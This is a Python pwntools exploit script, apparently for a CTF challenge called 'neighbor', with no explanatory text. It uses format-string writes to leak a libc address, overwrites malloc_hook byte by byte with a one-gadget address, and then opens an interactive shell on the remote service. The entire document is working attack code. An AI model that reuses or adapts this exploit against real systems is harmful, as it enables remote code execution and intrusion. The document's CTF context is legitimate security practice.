#!/usr/bin/env python
# -*- coding: utf-8 -*-
from pwn import *
from pwnpwnpwn import *
import time
host = "10.211.55.13"
port = 4869
host = "neighbor.chal.ctf.westerns.tokyo"
port = 37565
r = remote(host,port)
r.recvuntil("mayor.")

#payload = fmtchar(0,0xebf8,9,2)
payload = fmtchar(0,0x48,9)
r.sendline(payload)
time.sleep(1)
payload = fmtchar(0,0x90,11)
r.sendline(payload)
time.sleep(1)
payload = fmtchar(0,1,6)
#raw_input()
r.sendline(payload)
time.sleep(1)
payload = "%14$p"
r.sendline(payload)
print("fuk")
r.recvuntil("\n")
r.recvuntil("\n")
libc = int(r.recvuntil("\n"),16)- 0x203f1
malloc_hook = libc+ 0x3c1af0
print "libc:",hex(libc)
time.sleep(1)
payload = fmtchar(0,malloc_hook & 0xffff,11,2)
magic = libc+ 0xf1651
r.sendline(payload)
time.sleep(1)

payload = fmtchar(0,magic & 0xff ,6)
r.sendline(payload)
time.sleep(1)
for i in range(1,3):
    payload = fmtchar(0,(malloc_hook +i) & 0xff,11)
    r.sendline(payload)
    time.sleep(1)
    payload = fmtchar(0,(magic >> i*8 ) & 0xff ,6)
    r.sendline(payload)
    time.sleep(1)
r.interactive()
